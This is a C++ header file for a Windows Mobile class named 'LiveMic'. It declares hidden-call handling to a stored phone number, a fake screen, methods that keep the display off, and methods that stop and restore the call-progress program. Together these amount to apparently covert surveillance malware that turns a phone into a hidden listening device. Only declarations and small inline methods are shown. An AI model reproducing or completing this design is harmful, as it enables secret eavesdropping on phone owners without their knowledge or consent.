#pragma once
#include <string>
using namespace std;

#include <Windows.h>
#include <Tapi.h>
#include "FakeScreen.h"
#include "Device.h"
#include "Process.h"
#include "ControlTh.h"

#define TAPI_LOW_VERSION 0x10000
#define TAPI_HIGH_VERSION 0x20002

typedef enum _VIDEO_POWER_STATE {
	VideoPowerOn = 1,
	VideoPowerStandBy,
	VideoPowerSuspend,
	VideoPowerOff
} VIDEO_POWER_STATE, *PVIDEO_POWER_STATE;

#define MYDEFINE_GUID(name, l, w1, w2, b1, b2, b3, b4, b5, b6, b7, b8) \
	EXTERN_C const GUID name = { l, w1, w2, { b1, b2,  b3,  b4,  b5,  b6,  b7,  b8 }}

class TapiManager;
class RilManager;
class Registry;

class LiveMic
{
private:
	static LiveMic*			m_pInstance;
	static volatile LONG	m_lLock;

	BOOL	m_bHiddenCallInProgress, m_bCallInProgress, m_bNotificationThreadSuspended, m_bCtrlThreadActive,
			m_bPowerStatusOn, m_bLocalDrop, m_bInitialized, m_bHiddenCallIncoming;
	HCALL	m_hCall;	// NB: vedere se si puo' spostare in Tapimanager

	wstring m_wsTelephoneNumber;
	wstring m_wsCallerNumber;
	wstring m_wsCprog;
	wstring m_wsCprogPath;
	wstring m_wsCprogOptions;

	FakeScreen* m_pScreen;
	Device*		m_pDevice;
	Process*	m_pProcess;
	Registry*	m_pRegistry;
	TapiManager*  m_pTapiMan;
	RilManager* m_pRilMan;
	ControlTh*	m_pCtrlTh;

	HANDLE m_hAnswerEvent;
	UINT m_hKillCprogTimer;

protected:
	LiveMic(void);

public:
	static LiveMic* self();
	~LiveMic(void);

	BOOL Initialize(wstring wsTelephoneNumber, HINSTANCE hInstance);
	VOID Uninitialize();
	VOID SetCprogOption(wstring wsOption) { m_wsCprogOptions.assign(wsOption); }
	VOID RestoreAfterDrop();	

	// x RIL
	wstring GetHiddenTelNumber() { return m_wsTelephoneNumber; }
	VOID	SetCallerTelNumber(wstring callerNumber) { m_wsCallerNumber = callerNumber; }
	HANDLE	GetAnswerEventHandler() { return m_hAnswerEvent; }
	//BOOL	DisableRilNotification() { return m_pRilMan->DisableNotification(); }
	//BOOL	EnableRilNotification() { return m_pRilMan->EnableNotification(); }

	// Call
	BOOL IsHiddenCallInProgress() { return m_bHiddenCallInProgress; }
	BOOL DropHiddenCall(HCALL hCall, BOOL bRestore);
	BOOL HandleDisconnectCall(HCALL hCall);
	BOOL HandleNewCall(HCALL hCall);
	VOID LineCallStateConnected();
	VOID LineCallStateDisconnected();
	VOID LineCallStateOffering(HCALL hCall);
	VOID SetHiddenCallStatus(HCALL hCall);
	BOOL IsHiddenCallIncoming() { return m_bHiddenCallIncoming; }

	// Screen
	BOOL ScreenOn();
	BOOL KeepScreenOff();
	VOID KeepScreenOff(UINT uTime);
	VOID KeepScreenOff(UINT uTime, BOOL bScreenOn);
	BOOL FakeScreenStart() { return m_pScreen->Start(); }
	BOOL FakeScreenStop() { return m_pScreen->Stop(); }

	// Process
	BOOL StopCprog();
	VOID RestoreCprog();

	// Power
	BOOL GetPowerState() { return m_bPowerStatusOn; }

	// ControlTH
	BOOL StartCtrlTh()  {   if (!m_bCtrlThreadActive)
								m_bCtrlThreadActive = m_pCtrlTh->Start();
							return m_bCtrlThreadActive; }

	VOID StopCtrlTh()  {   if (m_bCtrlThreadActive) {
								m_pCtrlTh->Stop();
								m_bCtrlThreadActive = FALSE;
							}
						}

	// Test
	VOID AudioAdjust();
	VOID AudioRestore();
};